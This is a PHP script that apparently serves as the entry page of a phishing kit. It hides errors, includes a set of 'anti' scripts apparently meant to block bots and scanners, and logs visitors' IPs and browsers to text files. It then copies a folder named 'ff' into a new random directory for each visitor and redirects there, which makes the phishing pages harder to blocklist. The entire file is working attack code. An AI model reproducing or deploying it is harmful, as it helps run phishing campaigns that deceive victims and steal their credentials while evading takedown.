<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/9atila.php';

$file = "log.txt";
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("d-m-y");
$time = date("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$data = "IP: ".$ip.", Date: ".$date.", Time:".$time.", Browser: ".$browser;

$f=fopen($file, 'a');
fwrite($f,$data."\r\r\n");
fclose($f);

$random = rand(0,1900000).$_SERVER['REMOTE_ADDR'];
$dst		= substr(md5($random), 0, 6);
	
function recurse_copy($src, $dst) {

	$dir = opendir($src);
	$result = ($dir === false ? false : true);

	if ($result !== false) {
		$result = @mkdir($dst);

		if ($result === true) {
			while(false !== ( $file = readdir($dir)) ) { 
				if (( $file != '.' ) && ( $file != '..' ) && $result) { 
					if ( is_dir($src . '/' . $file) ) { 
						$result = recurse_copy($src . '/' . $file,$dst . '/' . $file); 
					} else { 
						$result = copy($src . '/' . $file,$dst . '/' . $file); 
					} 
				} 
			} 
			closedir($dir);
		}
	}

	return $result;
}

$src="ff";
recurse_copy( $src, $dst );
header("location:".$dst."");
$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
exit;

?>